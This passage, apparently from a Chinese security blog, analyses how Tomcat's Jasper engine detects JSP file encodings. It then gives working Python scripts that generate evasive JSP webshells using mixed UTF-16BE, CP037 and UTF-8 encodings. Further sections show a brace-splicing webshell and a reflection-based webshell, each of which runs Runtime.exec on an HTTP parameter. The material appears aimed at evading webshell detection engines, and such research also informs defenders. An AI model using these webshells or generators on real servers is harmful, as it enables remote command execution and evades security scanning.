class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, <span class="literal">null</span>, <span class="number">4</span>&#125;;  </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b0 == <span class="number">0</span> &amp;&amp; b1 == <span class="number">60</span> &amp;&amp; b2 == <span class="number">0</span> &amp;&amp; b3 == <span class="number">63</span>) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-16BE&quot;</span>, Boolean.TRUE, <span class="number">4</span>&#125;;  </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b0 == <span class="number">60</span> &amp;&amp; b1 == <span class="number">0</span> &amp;&amp; b2 == <span class="number">63</span> &amp;&amp; b3 == <span class="number">0</span>) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-16LE&quot;</span>, Boolean.FALSE, <span class="number">4</span>&#125;;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="keyword">return</span> b0 == <span class="number">76</span> &amp;&amp; b1 == <span class="number">111</span> &amp;&amp; b2 == <span class="number">167</span> &amp;&amp; b3 == <span class="number">148</span> ? <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;CP037&quot;</span>, <span class="literal">null</span>, <span class="number">4</span>&#125; : <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>, Boolean.FALSE, <span class="number">0</span>&#125;;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到createInitialReader方法后根据得到的编码和字节序信息来创建字符读取器，然后接着退回到getEncoding方法，调用<code>XMLEncodingDetector#scanXMLDecl</code>方法扫描XML声明部分（如<code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>），同时根据标准xml声明和非标准xml声明两种类型进行不对的处理，如果是标准xml声明，会用<code>XMLEncodingDetector#scanXMLDeclOrTextDecl</code>处理。</p>
+<p>首先会扫描XML声明，从扫描结果中获取编码属性。然后将encoding值设为该编码。而我们上一步在getEncodingName方法中，通过前几个字节判断的编码也是用这个值存储的，如果程序进入这里会更新encoding值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">scanXMLDeclOrTextDecl</span><span class="params">(<span class="type">boolean</span> scanningTextDecl)</span> <span class="keyword">throws</span> IOException, JasperException &#123;  </span><br><span class="line">    <span class="built_in">this</span>.scanXMLDeclOrTextDecl(scanningTextDecl, <span class="built_in">this</span>.fStrings);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">encodingPseudoAttr</span> <span class="operator">=</span> <span class="built_in">this</span>.fStrings[<span class="number">1</span>];  </span><br><span class="line">    <span class="keyword">if</span> (encodingPseudoAttr != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.isEncodingSetInProlog = <span class="literal">true</span>;  </span><br><span class="line">        <span class="built_in">this</span>.encoding = encodingPseudoAttr;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到<code>org.apache.jasper.compiler.ParserController</code>类，除此上面说的之外，还有<code>ParserController#getPageEncodingForJspSyntax</code>方法能设置编码。需要满足下面条件：</p>
+<ul>
+<li>文件没有BOM头标记（<code>!isBomPresent</code>）</li>
+<li>JSP配置中没有指定页面编码（<code>jspConfigPageEnc == null</code>）</li>
+</ul>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250406025128858.png"></p>
+<p>从文件中的pageEncoding或者contentType获取编码。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250406030503255.png"></p>
+<p>根据上面代码，可以声明编码的方式有下面几种：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;utf-16be&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;charset=utf-16be&quot;</span> %&gt;</span><br><span class="line">&lt;%@ tag language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;utf-16be&quot;</span>%&gt;</span><br><span class="line">&lt;%@ tag contentType=<span class="string">&quot;charset=utf-16be&quot;</span> %&gt;</span><br><span class="line">&lt;jsp:directive.page pageEncoding=<span class="string">&quot;utf-16be&quot;</span>/&gt;</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">&quot;charset=utf-16be&quot;</span>/&gt;</span><br><span class="line">&lt;jsp:directive.tag pageEncoding=<span class="string">&quot;utf-16be&quot;</span>/&gt;</span><br><span class="line">&lt;jsp:directive.tag contentType=<span class="string">&quot;charset=utf-16be&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><h4 id="UTF-16BE编码"><a href="#UTF-16BE编码" class="headerlink" title="UTF-16BE编码"></a>UTF-16BE编码</h4><p>p牛的文章中就提到的，利用引擎可能对某些编码检测不到进行绕过。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409110746431.png"></p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409110811746.png"></p>
+<p>或者去掉jsp指令</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409114904952.png"></p>
+<p>通过前两个字节(BOM头)判断编码为<code>UTF-16BE</code>。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409112504499.png"></p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409113142321.png"></p>
+<p>除此之外还有CP037、UTF-16LE等等。</p>
+<h4 id="UTF-8-UTF-16BE-双编码"><a href="#UTF-8-UTF-16BE-双编码" class="headerlink" title="UTF-8 + UTF-16BE 双编码"></a>UTF-8 + UTF-16BE 双编码</h4><p>同一篇文章中，p牛介绍的第二种Webshell是UTF-8编码加UTF-16BE编码，也就是一个jsp文件中，前部分用UTF-8编码，后部分用UTF-16BE编码。</p>
+<p>生成上述Webshell的脚本如下，运行即可得到该WebShell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">utf8_str = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">utf16be_str = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span></span><br><span class="line"><span class="string">%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码转换</span></span><br><span class="line">utf8_bytes = utf8_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">utf16be_bytes = utf16be_str.encode(<span class="string">&#x27;utf-16-be&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Dual_Encoding_WebShell.jsp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(utf8_bytes)</span><br><span class="line">    f.write(utf16be_bytes)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;两种编码内容已写入Dual_Encoding_WebShell.jsp&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>！！！这里需要注意，我们要让utf8_str字符串为偶数个字符，因为utf-16be是2&#x2F;4字节的编码，我们要让utf16be_str所处的位置是从第偶数个字节开始的，这样后续解析器才能用utf-16be编码解析出我们想要的utf16be_str字符串。</strong></p>
+</blockquote>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250415105939029.png"></p>
+<p>运行测试：</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250415105532604.png"></p>
+<p>简单解释一下，首先需要一个无BOM的编码，要让返回的数组第三位为false。因此前面的编码需要跳过。这样能让isBomPresent的值为false。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250417010758418.png"></p>
+<p>我们需要isBomPresent的值为false，这样在后续可以进入getPageEncodingForJspSyntax方法中从jsp文件中的指令获取编码，比如pageEncoding的值。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250417011034494.png"></p>
+<p>后续就会用上面得到的编码区解析文件里的内容。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250418005421467.png"></p>
+<h4 id="utf-16-cp037双编码"><a href="#utf-16-cp037双编码" class="headerlink" title="utf-16 + cp037双编码"></a>utf-16 + cp037双编码</h4><p>y4tacker文章中介绍的：<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/#%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%8F%8C%E7%BC%96%E7%A0%81jspwebshell">浅谈JspWebshell之编码</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a0 = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;</span>  </span><br><span class="line">a1 = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot;  </span></span><br><span class="line"><span class="string">          version=&quot;1.2&quot;&gt;  </span></span><br><span class="line"><span class="string">    &lt;jsp:directive.page contentType=&quot;text/html&quot;/&gt;  </span></span><br><span class="line"><span class="string">    &lt;jsp:declaration&gt;  </span></span><br><span class="line"><span class="string">    &lt;/jsp:declaration&gt;  </span></span><br><span class="line"><span class="string">    &lt;jsp:scriptlet&gt;  </span></span><br><span class="line"><span class="string">Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));  </span></span><br><span class="line"><span class="string">java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));  </span></span><br><span class="line"><span class="string">String line = &quot;&quot;;  </span></span><br><span class="line"><span class="string">while ((line = input.readLine()) != null) &#123;  </span></span><br><span class="line"><span class="string">  out.write(line+&quot;\\n&quot;);  </span></span><br><span class="line"><span class="string">&#125;  </span></span><br><span class="line"><span class="string">&lt;/jsp:scriptlet&gt;  </span></span><br><span class="line"><span class="string">    &lt;jsp:text&gt;  </span></span><br><span class="line"><span class="string">    &lt;/jsp:text&gt;  </span></span><br><span class="line"><span class="string">&lt;/jsp:root&gt;&#x27;&#x27;&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.jsp&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">f.write(a0.encode(<span class="string">&quot;utf-16&quot;</span>))  </span><br><span class="line">f.write(a1.encode(<span class="string">&quot;cp037&quot;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先在<code>XMLEncodingDetector#getEncodingName</code>方法识别bom头初步确定一个编码，就是前半部分的utf-16，然后在<code>XMLEncodingDetector#scanXMLDecl</code>中，因为识别到了<code>&lt;?xml</code>，调用<code>scanXMLDeclOrTextDecl</code>方法，从fString中获取c3p0编码。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250417172344639.png"></p>
+<h4 id="三编码"><a href="#三编码" class="headerlink" title="三编码"></a>三编码</h4><p>Y4tacker师傅的文章中，还介绍了三编码的方式。其中有一个关键的方法<code>ParserController#getPageEncodingForJspSyntax</code>，主要是去解析指令标签，然后从中获取设置的编码。这个方法是循环查找标签的，也就是说会一直去找想要的标签直到找到为止，因此指令标签放到任意位置皆可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getPageEncodingForJspSyntax</span><span class="params">(JspReader jspReader, Mark startMark)</span> <span class="keyword">throws</span> JasperException &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">encoding</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">saveEncoding</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    jspReader.reset(startMark);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span>(jspReader.skipUntil(<span class="string">&quot;&lt;&quot;</span>) != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (jspReader.matches(<span class="string">&quot;%--&quot;</span>)) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (jspReader.skipUntil(<span class="string">&quot;--%&gt;&quot;</span>) == <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isDirective</span> <span class="operator">=</span> jspReader.matches(<span class="string">&quot;%@&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (isDirective) &#123;  </span><br><span class="line">                jspReader.skipSpaces();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                isDirective = jspReader.matches(<span class="string">&quot;jsp:directive.&quot;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (isDirective &amp;&amp; (jspReader.matches(<span class="string">&quot;tag &quot;</span>) || jspReader.matches(<span class="string">&quot;page&quot;</span>))) &#123;  </span><br><span class="line">                jspReader.skipSpaces();  </span><br><span class="line">                <span class="type">Attributes</span> <span class="variable">attrs</span> <span class="operator">=</span> Parser.parseAttributes(<span class="built_in">this</span>, jspReader);  </span><br><span class="line">                encoding = <span class="built_in">this</span>.getPageEncodingFromDirective(attrs, <span class="string">&quot;pageEncoding&quot;</span>);  </span><br><span class="line">                <span class="keyword">if</span> (encoding != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="keyword">break</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                encoding = <span class="built_in">this</span>.getPageEncodingFromDirective(attrs, <span class="string">&quot;contentType&quot;</span>);  </span><br><span class="line">                <span class="keyword">if</span> (encoding != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    saveEncoding = encoding;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (encoding == <span class="literal">null</span>) &#123;  </span><br><span class="line">        encoding = saveEncoding;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> encoding;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据上面的一系列内容学习，大概可以了解到三处获取编码的地方，按程序流的顺序如下：</p>
+<ul>
+<li><code>XMLEncodingDetector#getEncodingName</code>方法通过Bom头初步获取</li>
+<li>识别到<code>&lt;?xml</code>就用<code>XMLEncodingDetector#scanXMLDeclOrTextDecl</code>获取encoding的值作为编码</li>
+<li><code>ParserController#getPageEncodingForJspSyntax</code>解析指令标签中的编码。这个过程会用上面方法得到的编码解析。</li>
+</ul>
+<p>简单介绍一下思路，首先需要一个执行命令的语句，其编码是a，一个jsp指令标签的语句，其编码为b，将编码结果作为一个jsp代码中的变量，其他jsp代码均为a编码，再此基础上，设置一个<code>&lt;?xml</code>标签的语句放在开头，指定编码encoding为b，这个语句的编码可以是d。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a0 = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">a1 = <span class="string">&#x27;&#x27;&#x27;&lt;%</span></span><br><span class="line"><span class="string">    Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmisl&quot;));</span></span><br><span class="line"><span class="string">    String tmp = &quot; &#x27;&#x27;&#x27;</span></span><br><span class="line">a2 = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page pageEncoding=&quot;UTF-16BE&quot;%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">a3 = <span class="string">&#x27;&#x27;&#x27;&quot;;%&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test3.jsp&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(a0.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    f.write(a1.encode(<span class="string">&quot;utf-16be&quot;</span>))</span><br><span class="line">    f.write(a2.encode(<span class="string">&quot;cp037&quot;</span>))</span><br><span class="line">    f.write(a3.encode(<span class="string">&quot;utf-16be&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这样tomcat识别时，首先识别为d，然后根据<code>&lt;?xml</code>语句中encoding值，将编码视为b，然后getPageEncodingForJspSyntax中会用b编码解析指令标签，得到指令编码视为a，后续就用a解析内容了，其中我们的执行相关的jsp代码就是a编码，自然能被解析。</p>
+<h2 id="Tomcat解析篇——标签"><a href="#Tomcat解析篇——标签" class="headerlink" title="Tomcat解析篇——标签"></a>Tomcat解析篇——标签</h2><p>这部分内容比较简单，简单过一下。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250419160813176.png"></p>
+<p>Tomcat的JSP引擎解析JSP文件，会将其拆分为静态内容（HTML&#x2F;CSS&#x2F;JS）和动态内容（JSP标签、脚本片段、表达式等）</p>
+<ul>
+<li><strong>静态内容</strong>：直接嵌入生成的Servlet代码中，通过<code>out.write()</code>或<code>out.print()</code>输出。</li>
+<li><strong>动态内容</strong>：转换为Java代码。例如：<ul>
+<li><code>&lt;% ... %&gt;</code> → 转换为<code>_jspService()</code>方法中的Java代码块。</li>
+<li><code>&lt;%= ... %&gt;</code> → 转换为<code>out.print(...)</code>语句。</li>
+<li>JSP指令（如<code>&lt;%@ page %&gt;</code>）用于设置Servlet的类属性。</li>
+</ul>
+</li>
+</ul>
+<p>举个例子：</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250420204558381.png"></p>
+<p><code>&lt;%%&gt;</code>标签的代码直接写入java文件中的_jspService方法中，后续编译成.class文件。这里YzddMr6师傅的ppt中，提到了代码拼接，有点类似注入的原理，通过花括号的拼接，让不合法的jsp文件能被解析成合法的java代码。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">  <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">  executeCmd(cmd);  </span><br><span class="line">  &#125; <span class="keyword">catch</span> (java.lang.Throwable t) &#123;  </span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">  _jspxFactory.releasePageContext(_jspx_page_context);  &#125;&#125;  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">executeCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException , javax.servlet.ServletException &#123;  </span><br><span class="line">  javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">_jspx_out</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  <span class="keyword">final</span> javax.servlet.http.HttpServletResponse response=<span class="literal">null</span>;  </span><br><span class="line">  javax.servlet.jsp.<span class="type">PageContext</span> <span class="variable">_jspx_page_context</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  <span class="keyword">try</span>&#123;  </span><br><span class="line">  Runtime.getRuntime().exec(cmd);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>剩下的可以看ppt，个人觉得难度不大就不继续赘述了。</p>
+<h2 id="危险类篇"><a href="#危险类篇" class="headerlink" title="危险类篇"></a>危险类篇</h2><h3 id="反射方法"><a href="#反射方法" class="headerlink" title="反射方法"></a>反射方法</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.corba.se.impl.logging.ActivationSystemException&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.corba.se.spi.activation.RepositoryPackage.ServerDef&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.logging.Logger&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(<span class="string">&quot;a&quot;</span>);  </span><br><span class="line">        <span class="type">ActivationSystemException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActivationSystemException</span>(logger);  </span><br><span class="line">        Class&lt;?&gt; serverTableEntryClass = Class.forName(<span class="string">&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = serverTableEntryClass.getDeclaredConstructor(  </span><br><span class="line">                ActivationSystemException.class,  </span><br><span class="line">                <span class="type">int</span>.class,  </span><br><span class="line">                ServerDef.class,  </span><br><span class="line">                <span class="type">int</span>.class,  </span><br><span class="line">                String.class,  </span><br><span class="line">                <span class="type">boolean</span>.class,  </span><br><span class="line">                <span class="type">boolean</span>.class  </span><br><span class="line">        );  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">ServerDef</span> <span class="variable">serverDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerDef</span>(<span class="string">&quot;cmisl&quot;</span>, <span class="string">&quot;cmisl&quot;</span>, <span class="string">&quot;cmisl&quot;</span>, <span class="string">&quot;cmisl&quot;</span>, <span class="string">&quot;cmisl&quot;</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> constructor.newInstance(  </span><br><span class="line">                exception,  </span><br><span class="line">                <span class="number">0</span>,  </span><br><span class="line">                serverDef,  </span><br><span class="line">                <span class="number">0</span>,  </span><br><span class="line">                <span class="string">&quot;cmisl&quot;</span>,  </span><br><span class="line">                <span class="literal">true</span>,  </span><br><span class="line">                <span class="literal">true</span>  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">activationCmdField</span> <span class="operator">=</span> serverTableEntryClass.getDeclaredField(<span class="string">&quot;activationCmd&quot;</span>);  </span><br><span class="line">        activationCmdField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        activationCmdField.set(serverTableEntry, cmd);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">verifyMethod</span> <span class="operator">=</span> serverTableEntryClass.getMethod(<span class="string">&quot;verify&quot;</span>);  </span><br><span class="line">        verifyMethod.invoke(serverTableEntry);  </span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250421025956853.png"></p>
+<p>也比较简单，反射调用危险函数，该函数调用Runtime.exe方法指令命令，参数可以反射修改，导致执行期望的命令。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250421030040294.png"></p>
+<h3 id="反射属性"><a href="#反射属性" class="headerlink" title="反射属性"></a>反射属性</h3><p>setter属性，原本应该是目标类的setter方法，通过反射让其为Runtime.exec方法的Method方法。</p>
